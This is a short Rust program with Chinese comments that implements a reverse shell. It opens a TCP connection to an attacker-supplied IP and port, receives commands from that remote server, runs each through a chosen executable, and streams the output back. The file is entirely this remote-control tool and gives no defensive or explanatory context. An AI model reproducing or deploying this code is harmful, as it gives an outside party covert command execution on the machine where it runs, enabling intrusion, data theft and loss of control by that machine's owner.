use std::env;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::{Command, Stdio};

fn main() {
    // 获取命令行参数
    let args: Vec<String> = env::args().collect();

    if args.len() < 3 {
        println!("Usage: {} <target_ip:port> <executable_path>", args[0]);
        return;
    }

    let target = &args[1];
    let executable_path = &args[2];

    // 尝试连接到目标服务器
    if let Ok(mut stream) = TcpStream::connect(target) {
        println!("Connected to {}", target);

        loop {
            // 接收来自服务器的命令
            let mut buffer = [0; 1024];
            match stream.read(&mut buffer) {
                Ok(size) => {
                    if size == 0 {
                        // 连接关闭
                        break;
                    }
                    let command = String::from_utf8_lossy(&buffer[..size]);

                    // 执行命令并捕获输出
                    let output = Command::new(executable_path)
                        .arg(&command)
                        .stdout(Stdio::piped())
                        .stderr(Stdio::piped())
                        .output()
                        .expect("Failed to execute command");

                    // 将命令输出写入TCP流，发送回服务器
                    if let Ok(stdout) = String::from_utf8(output.stdout) {
                        stream.write_all(stdout.as_bytes()).unwrap();
                    }

                    if let Ok(stderr) = String::from_utf8(output.stderr) {
                        stream.write_all(stderr.as_bytes()).unwrap();
                    }
                }
                Err(e) => {
                    println!("Error reading from stream: {}", e);
                    break;
                }
            }
        }
    } else {
        println!("Failed to connect to {}", target);
    }
}
